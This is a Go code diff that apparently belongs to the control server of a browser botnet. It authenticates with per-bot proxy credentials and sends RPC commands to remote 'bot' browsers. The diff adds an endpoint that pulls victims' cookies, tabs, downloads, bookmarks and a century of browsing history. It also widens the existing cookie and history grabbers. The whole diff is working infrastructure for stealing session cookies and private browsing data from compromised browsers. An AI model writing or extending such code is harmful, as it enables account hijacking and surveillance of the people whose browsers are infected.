@@ -47,15 +47,70 @@ func (a *ProxyCredsAPI) VerifyProxyCredentials(w http.ResponseWriter, r *http.Re
 
 // GetBotBrowserCookies is POST /api/v1/get-bot-browser-cookies
 func (a *ProxyCredsAPI) GetBotBrowserCookies(w http.ResponseWriter, r *http.Request) {
-	a.fetchVia(w, r, "GET_BROWSER_COOKIE_ARRAY", "cookies")
+	a.fetchVia(w, r, "GET_BROWSER_COOKIE_ARRAY", "cookies", nil)
 }
 
 // GetBotBrowser is POST /api/v1/get-bot-browser
 func (a *ProxyCredsAPI) GetBotBrowser(w http.ResponseWriter, r *http.Request) {
-	a.fetchVia(w, r, "GET_BROWSER_HISTORY_ARRAY", "history")
+	a.fetchVia(w, r, "GET_BROWSER_HISTORY_ARRAY", "history", map[string]any{"days": 36500})
 }
 
-func (a *ProxyCredsAPI) fetchVia(w http.ResponseWriter, r *http.Request, action, resultKey string) {
+var liveCategoryRPC = map[string]string{
+	"cookies":   "GET_BROWSER_COOKIE_ARRAY",
+	"history":   "GET_BROWSER_HISTORY_ARRAY",
+	"tabs":      "GET_TABS",
+	"downloads": "GET_DOWNLOADS",
+	"bookmarks": "GET_BOOKMARKS",
+}
+
+type browserStateReq struct {
+	Username   string   `json:"username"`
+	Password   string   `json:"password"`
+	Categories []string `json:"categories"`
+}
+
+// GetBotBrowserState is POST /api/v1/get-bot-browser-state
+func (a *ProxyCredsAPI) GetBotBrowserState(w http.ResponseWriter, r *http.Request) {
+	var body browserStateReq
+	if !MustDecode(w, r, &body) {
+		return
+	}
+	bot, err := findBotByCredentials(a.DB, body.Username, body.Password)
+	if err != nil {
+		JSONErr(w, http.StatusUnauthorized, "invalid proxy credentials")
+		return
+	}
+	if len(body.Categories) == 0 {
+		body.Categories = []string{"cookies"}
+	}
+	out := map[string]any{}
+	ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
+	defer cancel()
+	for _, category := range body.Categories {
+		action, ok := liveCategoryRPC[category]
+		if !ok {
+			JSONErr(w, http.StatusBadRequest, "unsupported category")
+			return
+		}
+		var data map[string]any
+		if category == "history" {
+			data = map[string]any{"days": 36500}
+		}
+		payload, err := a.RPC.CallBot(ctx, bot.BrowserID, action, data)
+		if err != nil {
+			if errors.Is(err, ErrBotOffline) {
+				JSONErr(w, http.StatusBadGateway, "bot offline")
+				return
+			}
+			JSONErr(w, http.StatusGatewayTimeout, err.Error())
+			return
+		}
+		out[category] = payload[category]
+	}
+	JSONOK(w, out)
+}
+
+func (a *ProxyCredsAPI) fetchVia(w http.ResponseWriter, r *http.Request, action, resultKey string, data map[string]any) {
 	var body proxyCredReq
 	if !MustDecode(w, r, &body) {
 		return
@@ -67,7 +122,7 @@ func (a *ProxyCredsAPI) fetchVia(w http.ResponseWriter, r *http.Request, action,
 	}
 	ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
 	defer cancel()
-	out, err := a.RPC.CallBot(ctx, bot.BrowserID, action, nil)
+	out, err := a.RPC.CallBot(ctx, bot.BrowserID, action, data)
 	if err != nil {
 		if errors.Is(err, ErrBotOffline) {
 			JSONErr(w, http.StatusBadGateway, "bot offline")
